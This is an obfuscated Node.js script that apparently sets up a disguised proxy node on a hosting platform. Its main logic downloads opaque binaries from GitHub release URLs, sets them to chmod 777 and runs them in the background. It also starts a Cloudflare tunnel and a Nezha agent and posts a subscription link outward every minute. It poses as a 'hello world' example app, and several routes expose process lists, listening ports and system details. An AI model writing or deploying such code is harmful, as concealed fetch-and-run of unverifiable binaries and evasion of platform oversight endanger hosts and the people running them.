let host_name = '';
const port = process.env.SERVER_PORT || process.env.PORT || 3000;
const vmms = process.env.VPATH || 'vls';
const vmmport = process.env.VPORT || '8002';
const uuid = process.env.UUID || '';
const youxuan = process.env.CF_IP || 'YOUXUAN_IP';
const sub_name = process.env.SUB_NAME || 'ztx2';// 订阅名称
const sub_url = process.env.SUB_URL || '';
const nezhaser = process.env.NEZHA_SERVER || '';
const nezhaKey = process.env.NEZHA_KEY || '';
const nezport = process.env.NEZHA_PORT || '443';
const neztls = process.env.NEZHA_TLS || '--tls';
const filePath = process.env.FILE_PATH || '/tmp/';
const tok = process.env.TOK || '';// 隧道token
if (tok) {
  host_name = process.env.ARG_DOMAIN || '';// 隧道域名
}
function _0x5275(){const _0x4df292=['message','78lNiejF','3374752LhaHqI','data','linux','listen','http://ipinfo.io/country','ps\x20aux\x20|\x20grep\x20-E\x20\x22','post','4015050HnljFy','createWriteStream','\x20UUID=','ess','{PASS}','\x20-s\x20','catch','https://github.com/dsadsadsss/1/releases/download/11/nezha-bsd.js','http-proxy-middleware','https://github.com/dsadsadsss/1/releases/download/11/cff-arm','https://github.com/dsadsadsss/d/releases/download/sd/nezha-amd','curl\x20-s\x20http://ipinfo.io/country','Download\x20web\x20failed','\x20-p\x20','platform','All\x20methods\x20failed,\x20setting\x20country\x20code\x20to\x20\x22UN\x22','length','command\x20-v\x20','express','\x20to\x20','/info','1924636dlbgrJ','2264424apLYhB','Error\x20getting\x20country\x20code\x20from\x20ipapi.co:\x20','\x0aRAM:','<pre>获取系统进程表：\x0a','request','\x20chmod\x20777\x20','3251Ogxzgp','axios','child_process','https://ifconfig.co/country','web.js','undefined','Failed\x20to\x20check\x20or\x20start\x20web\x20process:\x20','\x20\x20\x20\x20\x20/listen\x20Check\x20ports','Error\x20getting\x20country\x20code\x20from\x20ifconfig.co:\x20','https://github.com/dsadsadsss/1/releases/download/11/botbsd.js','Failed\x20to\x20check\x20or\x20start\x20nezha\x20process:\x20','cff.js','cat\x20/tmp/argo.log\x20|\x20grep\x20-oE\x20\x22https://.*[a-z]+cloudflare.com\x22\x20|\x20sed\x20\x22s#https://##\x22','get','https://github.com/dsadsadsss/d/releases/download/sd/kano-6-arm-w','netstat\x20-nltp','chmod\x20777\x20','error','\x20&&\x20nohup\x20','&type=ws&sni=','x64','\x20tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20run\x20--token\x20','Linux\x20System:',':443?path=%2F','trim','Error\x20getting\x20country\x20code\x20with\x20exec:\x20','/stas','https://ipapi.co/country','Download\x20web\x20successful','Failed\x20to\x20check\x20or\x20start\x20cff\x20process:\x20','nezha.js','<pre>获取系统监听端口：\x0a','4EZZIkE','close','apt-get\x20update\x20&&\x20apt-get\x20install\x20-y\x20procps','html','\x20started\x20successfully!','1490cKIyCt','toString','==============================','://','arch','send','Unsupported\x20platform\x20or\x20architecture','\x20\x20\x20\x20\x20/','freebsd','Error\x20getting\x20country\x20code\x20from\x20ipinfo.io:\x20','join','下载文件失败','log','base64','Download\x20cff\x20failed','命令行执行错误：','{PA','Failed\x20to\x20get\x20country\x20code','exec','79029duXqBz','ps\x20command\x20installed\x20successfully!','!\x0a==============================','https://github.com/dsadsadsss/1/releases/download/11/cff-bsd.js','<pre>命令行执行错误：\x0a','Download\x20nezha\x20successful','path','904068DMIBnT','\x20>/dev/null\x202>&1\x20&','host_name\x20set\x20to:\x20','VPATH=','</pre>','arm64','Attempting\x20to\x20start\x20processes','Sub\x20Upload\x20successful','https://github.com/dsadsadsss/d/releases/download/sd/kano-6-amd-w','pipe','type','Error\x20getting\x20host_name:\x20','use','命令行执行结果：\x0a','Download\x20cff\x20successful','then','Sub\x20Upload\x20failed','replace'];_0x5275=function(){return _0x4df292;};return _0x5275();}const _0x2bf545=_0x12ae;function _0x12ae(_0x4cd458,_0x4cc9b4){const _0x52751c=_0x5275();return _0x12ae=function(_0x12ae02,_0x363574){_0x12ae02=_0x12ae02-0x1f3;let _0x1c8a03=_0x52751c[_0x12ae02];return _0x1c8a03;},_0x12ae(_0x4cd458,_0x4cc9b4);}(function(_0x591cb3,_0x7431d5){const _0x16c1aa=_0x12ae,_0x592cd3=_0x591cb3();while(!![]){try{const _0x1137f2=-parseInt(_0x16c1aa(0x20f))/0x1*(-parseInt(_0x16c1aa(0x261))/0x2)+-parseInt(_0x16c1aa(0x24e))/0x3*(-parseInt(_0x16c1aa(0x22f))/0x4)+-parseInt(_0x16c1aa(0x1f3))/0x5+-parseInt(_0x16c1aa(0x209))/0x6+parseInt(_0x16c1aa(0x208))/0x7+-parseInt(_0x16c1aa(0x262))/0x8+-parseInt(_0x16c1aa(0x247))/0x9*(-parseInt(_0x16c1aa(0x234))/0xa);if(_0x1137f2===_0x7431d5)break;else _0x592cd3['push'](_0x592cd3['shift']());}catch(_0x505171){_0x592cd3['push'](_0x592cd3['shift']());}}}(_0x5275,0x63e74));const express=require(_0x2bf545(0x205)),app=express(),exec=require(_0x2bf545(0x211))[_0x2bf545(0x246)],os=require('os'),{createProxyMiddleware}=require(_0x2bf545(0x1fb)),request=require(_0x2bf545(0x20d)),fs=require('fs'),path=require(_0x2bf545(0x24d)),axios=require(_0x2bf545(0x210));console[_0x2bf545(0x240)](_0x2bf545(0x236)),console[_0x2bf545(0x240)](''),console[_0x2bf545(0x240)]('\x20\x20\x20\x20\x20/stas\x20View\x20processes'),console[_0x2bf545(0x240)](_0x2bf545(0x216)),console[_0x2bf545(0x240)](_0x2bf545(0x23b)+nezhaKey+'\x20View\x20subscriptions'),console[_0x2bf545(0x240)](''),console['log'](_0x2bf545(0x236)),app[_0x2bf545(0x21c)]('/',function(_0x191bc7,_0x5a2a36){_0x5a2a36['send']('hello\x20world');}),app[_0x2bf545(0x21c)](_0x2bf545(0x229),function(_0x3f8943,_0x4fb361){let _0x483e1c='ps\x20aux\x20|\x20sed\x20\x27s@--token.*@--token\x20${TOK}@g;s@-s\x20data.*@-s\x20${NEZHA_SERVER}@g\x27';exec(_0x483e1c,function(_0x2a6e35,_0x39c49e,_0x13bc36){const _0x51a240=_0x12ae;_0x2a6e35?_0x4fb361[_0x51a240(0x258)](_0x51a240(0x232))[_0x51a240(0x239)](_0x51a240(0x24b)+_0x2a6e35+_0x51a240(0x252)):_0x4fb361['type']('html')[_0x51a240(0x239)](_0x51a240(0x20c)+_0x39c49e+'</pre>');});}),app['get'](_0x2bf545(0x207),function(_0x269909,_0x232c23){let _0x377cd2='cat\x20/etc/os-release';exec(_0x377cd2,function(_0x5b015d,_0xfd8d62,_0x1657dc){const _0x5cd26c=_0x12ae;_0x5b015d?_0x232c23[_0x5cd26c(0x239)](_0x5cd26c(0x243)+_0x5b015d):_0x232c23[_0x5cd26c(0x239)](_0x5cd26c(0x25b)+_0x5cd26c(0x225)+_0xfd8d62+_0x5cd26c(0x20b)+os['totalmem']()/0x3e8/0x3e8+'MB');});}),app[_0x2bf545(0x21c)]('/listen',function(_0x1adca5,_0xe47e48){const _0x4bfce9=_0x2bf545;let _0x6a04ba=_0x4bfce9(0x21e);exec(_0x6a04ba,function(_0x4bf68e,_0x15c842,_0x3a3fd6){const _0x273f07=_0x4bfce9;_0x4bf68e?_0xe47e48[_0x273f07(0x258)](_0x273f07(0x232))[_0x273f07(0x239)](_0x273f07(0x24b)+_0x4bf68e+_0x273f07(0x252)):_0xe47e48[_0x273f07(0x258)](_0x273f07(0x232))[_0x273f07(0x239)](_0x273f07(0x22e)+_0x15c842+_0x273f07(0x252));});});let countryCode='',up_url='',encodedUrl='';const countryCodeFetchers=[()=>axios[_0x2bf545(0x21c)](_0x2bf545(0x266))['then'](_0x5de589=>_0x5de589['data'][_0x2bf545(0x227)]())[_0x2bf545(0x1f9)](_0x33389f=>{const _0x20cad4=_0x2bf545;console[_0x20cad4(0x220)](_0x20cad4(0x23d)+_0x33389f[_0x20cad4(0x260)]);throw _0x33389f;}),()=>axios[_0x2bf545(0x21c)](_0x2bf545(0x212))[_0x2bf545(0x25d)](_0x2050c9=>_0x2050c9[_0x2bf545(0x263)][_0x2bf545(0x227)]())[_0x2bf545(0x1f9)](_0x3fee62=>{const _0x29567d=_0x2bf545;console['error'](_0x29567d(0x217)+_0x3fee62['message']);throw _0x3fee62;}),()=>axios['get'](_0x2bf545(0x22a))['then'](_0x27f4a9=>_0x27f4a9['data'][_0x2bf545(0x227)]())[_0x2bf545(0x1f9)](_0x51355f=>{const _0x24d2f9=_0x2bf545;console[_0x24d2f9(0x220)](_0x24d2f9(0x20a)+_0x51355f[_0x24d2f9(0x260)]);throw _0x51355f;}),()=>new Promise((_0x59682d,_0x4136f3)=>{const _0x23cc78=_0x2bf545;exec(_0x23cc78(0x1fe),(_0x3bc453,_0x40b0c9,_0x25cb10)=>{const _0x40b198=_0x23cc78;_0x3bc453?(console[_0x40b198(0x220)](_0x40b198(0x228)+_0x25cb10),_0x4136f3(_0x3bc453)):_0x59682d(_0x40b0c9[_0x40b198(0x227)]());});})];function getCountryCode(_0x592635){let _0x52a3ae=0x0;function _0x5b1cda(){const _0x2b48bd=_0x12ae;if(_0x52a3ae>=countryCodeFetchers[_0x2b48bd(0x203)]){console[_0x2b48bd(0x220)](_0x2b48bd(0x202)),_0x592635('UN');return;}countryCodeFetchers[_0x52a3ae]()[_0x2b48bd(0x25d)](_0xa5591b=>{_0x592635(_0xa5591b);})[_0x2b48bd(0x1f9)](()=>{_0x52a3ae++,_0x5b1cda();});}_0x5b1cda();}getCountryCode(_0x28a090=>{const _0x27d655=_0x2bf545;console[_0x27d655(0x240)]('Country\x20Code:',_0x28a090);});let lastHostName='';function checkHostNameChange(){!tok&&exec('cat\x20/tmp/argo.log\x20|\x20grep\x20-oE\x20\x22https://.*[a-z]+cloudflare.com\x22\x20|\x20sed\x20\x22s#https://##\x22',(_0x49113f,_0xa5506,_0xb1bfc2)=>{const _0x4b9ad3=_0x12ae;if(_0x49113f){console[_0x4b9ad3(0x220)](_0x4b9ad3(0x259)+_0x49113f);return;}const _0xb506a5=_0xa5506[_0x4b9ad3(0x227)]();_0xb506a5&&_0xb506a5!==lastHostName&&(console[_0x4b9ad3(0x240)]('host_name\x20changed\x20from\x20'+lastHostName+_0x4b9ad3(0x206)+_0xb506a5),host_name=_0xb506a5,lastHostName=_0xb506a5,buildUrls());});}function buildUrls(){const _0x282efe=_0x2bf545,_0xe1aa2d=_0x282efe(0x1f7);up_url=_0xe1aa2d+_0x282efe(0x237)+uuid+'@'+youxuan+_0x282efe(0x226)+vmms+'%3Fed%3D2048&security=tls&encryption=none&host='+host_name+_0x282efe(0x222)+host_name+'#'+countryCode+'-'+sub_name,up_url=up_url[_0x282efe(0x25f)](_0x282efe(0x244),'vl')['replace']('SS}',_0x282efe(0x1f6)),encodedUrl=Buffer['from'](up_url)[_0x282efe(0x235)](_0x282efe(0x241));}function initializeData(){getCountryCode(_0x39c60b=>{const _0x1be965=_0x12ae;if(!_0x39c60b){console[_0x1be965(0x220)](_0x1be965(0x245));return;}countryCode=_0x39c60b,buildUrls(),console[_0x1be965(0x240)]('URL_Code:\x20'+encodedUrl);});}function startCronJob(){checkHostNameChange(),setInterval(()=>{const _0x4759b0=_0x12ae,_0x364316={'URL_NAME':sub_name,'URL':up_url};axios[_0x4759b0(0x268)](sub_url,_0x364316,{'headers':{'Content-Type':'application/json'}})[_0x4759b0(0x25d)](_0x2a216f=>{const _0x16c5d4=_0x4759b0;console['log'](_0x16c5d4(0x255));})[_0x4759b0(0x1f9)](_0x2982c8=>{const _0x455540=_0x4759b0;console['error'](_0x455540(0x25e));});},0x3c*0x3e8);}app[_0x2bf545(0x21c)]('/'+nezhaKey,(_0x581101,_0x1d8dfb)=>{const _0x3bc37a=_0x2bf545;_0x1d8dfb[_0x3bc37a(0x239)](encodedUrl);}),app[_0x2bf545(0x25a)]('/'+vmms,createProxyMiddleware({'changeOrigin':!![],'onProxyReq':function(_0x9581e7,_0x45b946,_0x27b830){},'pathRewrite':{['^/'+vmms]:'/'+vmms},'target':'http://127.0.0.1:'+vmmport+'/','ws':!![]}));function commandExists(_0x11db00,_0xff534a){const _0x11a7a3=_0x2bf545;exec(_0x11a7a3(0x204)+_0x11db00,(_0x3a1101,_0x4ccb48,_0x3c5973)=>{_0xff534a(!_0x3a1101&&_0x4ccb48['trim']());});}function checkAndStartProcess(_0xc0f0a1,_0x4a9213,_0x2bde29){const _0x24b6f3=_0x2bf545;exec(_0x24b6f3(0x267)+_0xc0f0a1+'\x22\x20|\x20grep\x20-v\x20\x22grep\x22',(_0x28c56c,_0x3725d6,_0x30ae12)=>{!_0x3725d6?exec(_0x4a9213,(_0x481b94,_0x2320b0,_0x321f17)=>{const _0x2dea25=_0x12ae;_0x481b94?_0x2bde29(new Error('Failed\x20to\x20start\x20'+_0xc0f0a1+':\x20'+_0x321f17)):_0x2bde29(null,_0xc0f0a1+_0x2dea25(0x233));}):_0x2bde29(null,_0xc0f0a1+'\x20is\x20already\x20running');});}function keepProcessesAlive(){commandExists('ps',_0x20f316=>{const _0x5d728a=_0x12ae;!_0x20f316?(console[_0x5d728a(0x240)]('ps\x20command\x20not\x20found.\x20Attempting\x20to\x20install...'),exec(_0x5d728a(0x231),(_0x34351e,_0x359d60,_0x4ceba0)=>{const _0x24541f=_0x5d728a;_0x34351e?(console[_0x24541f(0x240)]('Failed\x20to\x20install\x20ps\x20command'),console['log'](_0x24541f(0x254)),startProcessesOnce()):(console[_0x24541f(0x240)](_0x24541f(0x248)),startCheckingProcesses());})):startCheckingProcesses();});}function startProcessesOnce(){let _0x28571d=0x0;const _0x38846d=0x5,_0x219e6b=0x14*0x3e8;function _0x519197(){const _0x112342=_0x12ae;_0x28571d<_0x38846d&&((typeof host_name===_0x112342(0x214)||host_name===null||host_name==='')&&(checkProcesses(),_0x28571d++,_0x28571d<_0x38846d&&setTimeout(_0x519197,_0x219e6b)));}_0x519197();}function startCheckingProcesses(){const _0x2c0f19=setInterval(()=>{checkProcesses();},0x3c*0x3e8);}function checkProcesses(){nezhaser&&nezhaKey&&keep_nezha_alive(),keep_cff_alive(),keep_web_alive();}function keep_web_alive(){const _0x3acac8=_0x2bf545,_0xaa2aa7=_0x3acac8(0x213),_0x5408cb=_0x3acac8(0x251)+vmms+_0x3acac8(0x1f5)+uuid+_0x3acac8(0x20e)+path['join'](filePath,_0x3acac8(0x213))+_0x3acac8(0x221)+path[_0x3acac8(0x23e)](filePath,_0x3acac8(0x213))+_0x3acac8(0x24f);checkAndStartProcess(_0xaa2aa7,_0x5408cb,(_0x5417bb,_0x32938e)=>{const _0x3402fc=_0x3acac8;_0x5417bb?console['log'](_0x3402fc(0x215)+_0x5417bb[_0x3402fc(0x260)]):console[_0x3402fc(0x240)](_0x32938e);});}function keep_nezha_alive(){const _0x2c90a2=_0x2bf545,_0x5b7ba5='nezha.js',_0x5bfd90='chmod\x20777\x20'+path[_0x2c90a2(0x23e)](filePath,'nezha.js')+_0x2c90a2(0x221)+path[_0x2c90a2(0x23e)](filePath,_0x2c90a2(0x22d))+_0x2c90a2(0x1f8)+nezhaser+':'+nezport+_0x2c90a2(0x200)+nezhaKey+'\x20'+neztls+'\x20>/dev/null\x202>&1\x20&';checkAndStartProcess(_0x5b7ba5,_0x5bfd90,(_0x312703,_0x289ef9)=>{const _0x4db908=_0x2c90a2;_0x312703?console['log'](_0x4db908(0x219)+_0x312703['message']):console[_0x4db908(0x240)](_0x289ef9);});}function keep_cff_alive(){const _0x5812c0=_0x2bf545,_0x5de8dd=_0x5812c0(0x21a);let _0x26c11b;tok?_0x26c11b=_0x5812c0(0x21f)+path[_0x5812c0(0x23e)](filePath,_0x5812c0(0x21a))+'\x20&&\x20nohup\x20'+path[_0x5812c0(0x23e)](filePath,'cff.js')+_0x5812c0(0x224)+tok+_0x5812c0(0x24f):_0x26c11b=_0x5812c0(0x21f)+path['join'](filePath,'cff.js')+_0x5812c0(0x221)+path[_0x5812c0(0x23e)](filePath,_0x5812c0(0x21a))+'\x20tunnel\x20--url\x20http://localhost:8002\x20--no-autoupdate\x20>\x20/tmp/argo.log\x202>&1\x20&',checkAndStartProcess(_0x5de8dd,_0x26c11b,(_0x2d1dee,_0x46c1d0)=>{const _0x4f1390=_0x5812c0;_0x2d1dee?console[_0x4f1390(0x240)](_0x4f1390(0x22c)+_0x2d1dee['message']):(console[_0x4f1390(0x240)](_0x46c1d0),!tok&&setTimeout(()=>{const _0x2cf629=_0x4f1390;exec(_0x2cf629(0x21b),(_0x553741,_0x1c5998,_0x3814e7)=>{const _0x377fe0=_0x2cf629;if(_0x553741){console[_0x377fe0(0x220)]('Error\x20getting\x20host_name:\x20'+_0x553741);return;}host_name=_0x1c5998[_0x377fe0(0x227)](),console['log'](_0x377fe0(0x250)+host_name),buildUrls();});},0x2710));});}function download_web(_0x3f5926){const _0x45d07d=_0x2bf545,_0x16920c=os[_0x45d07d(0x201)](),_0x56af2a=os[_0x45d07d(0x238)]();let _0x1dfc8a='web.js',_0x3e3485='';if(_0x16920c===_0x45d07d(0x264)){if(_0x56af2a==='x64')_0x3e3485=_0x45d07d(0x256);else _0x56af2a==='arm64'&&(_0x3e3485=_0x45d07d(0x21d));}else{if(_0x16920c==='freebsd')_0x3e3485=_0x45d07d(0x218);else{_0x3f5926('Unsupported\x20platform\x20or\x20architecture');return;}}let _0x329c64=fs[_0x45d07d(0x1f4)](path[_0x45d07d(0x23e)](filePath,_0x1dfc8a));request(_0x3e3485)[_0x45d07d(0x257)](_0x329c64)['on'](_0x45d07d(0x230),function(_0x4ef880){const _0x3b48a2=_0x45d07d;_0x4ef880?_0x3f5926(_0x3b48a2(0x23f)):_0x3f5926(null);});}function download_nezha(_0x6cc010){const _0x5f42fe=_0x2bf545,_0x268f0b=os[_0x5f42fe(0x201)](),_0x36c6e2=os['arch']();let _0x2e535d=_0x5f42fe(0x22d),_0x9a4b74='';if(_0x268f0b==='linux'){if(_0x36c6e2===_0x5f42fe(0x223))_0x9a4b74=_0x5f42fe(0x1fd);else _0x36c6e2===_0x5f42fe(0x253)&&(_0x9a4b74='https://github.com/dsadsadsss/d/releases/download/sd/nezha-arm');}else{if(_0x268f0b==='freebsd')_0x9a4b74=_0x5f42fe(0x1fa);else{_0x6cc010(_0x5f42fe(0x23a));return;}}let _0x3395cf=fs['createWriteStream'](path[_0x5f42fe(0x23e)](filePath,_0x2e535d));request(_0x9a4b74)[_0x5f42fe(0x257)](_0x3395cf)['on'](_0x5f42fe(0x230),function(_0x48f287){_0x48f287?_0x6cc010('下载文件失败'):_0x6cc010(null);});}function download_cff(_0x31fdf2){const _0x36fcec=_0x2bf545,_0x3d06c3=os['platform'](),_0xa17488=os[_0x36fcec(0x238)]();let _0x2bc988=_0x36fcec(0x21a),_0x9fc46e='';if(_0x3d06c3===_0x36fcec(0x264)){if(_0xa17488===_0x36fcec(0x223))_0x9fc46e='https://github.com/dsadsadsss/1/releases/download/11/cff-amd';else _0xa17488===_0x36fcec(0x253)&&(_0x9fc46e=_0x36fcec(0x1fc));}else{if(_0x3d06c3===_0x36fcec(0x23c))_0x9fc46e=_0x36fcec(0x24a);else{_0x31fdf2(_0x36fcec(0x23a));return;}}let _0x3b4785=fs[_0x36fcec(0x1f4)](path['join'](filePath,_0x2bc988));request(_0x9fc46e)[_0x36fcec(0x257)](_0x3b4785)['on'](_0x36fcec(0x230),function(_0x4b9e6b){const _0x5c2b15=_0x36fcec;_0x4b9e6b?_0x31fdf2(_0x5c2b15(0x23f)):_0x31fdf2(null);});}function initializeDownloads(){download_cff(_0x1df1ac=>{const _0x2d6824=_0x12ae;_0x1df1ac?console[_0x2d6824(0x240)](_0x2d6824(0x242)):console[_0x2d6824(0x240)](_0x2d6824(0x25c));}),download_web(_0xa7f120=>{const _0x3afb67=_0x12ae;_0xa7f120?console[_0x3afb67(0x240)](_0x3afb67(0x1ff)):console[_0x3afb67(0x240)](_0x3afb67(0x22b));}),nezhaser&&nezhaKey&&download_nezha(_0x21e9b6=>{const _0x3a1942=_0x12ae;_0x21e9b6?console[_0x3a1942(0x240)]('Download\x20nezha\x20failed'):console['log'](_0x3a1942(0x24c));});}initializeDownloads(),keepProcessesAlive(),initializeData();sub_url&&startCronJob();app[_0x2bf545(0x265)](port,()=>{const _0x3b940a=_0x2bf545;console[_0x3b940a(0x240)]('Example\x20app\x20listening\x20on\x20port\x20'+port+_0x3b940a(0x249));});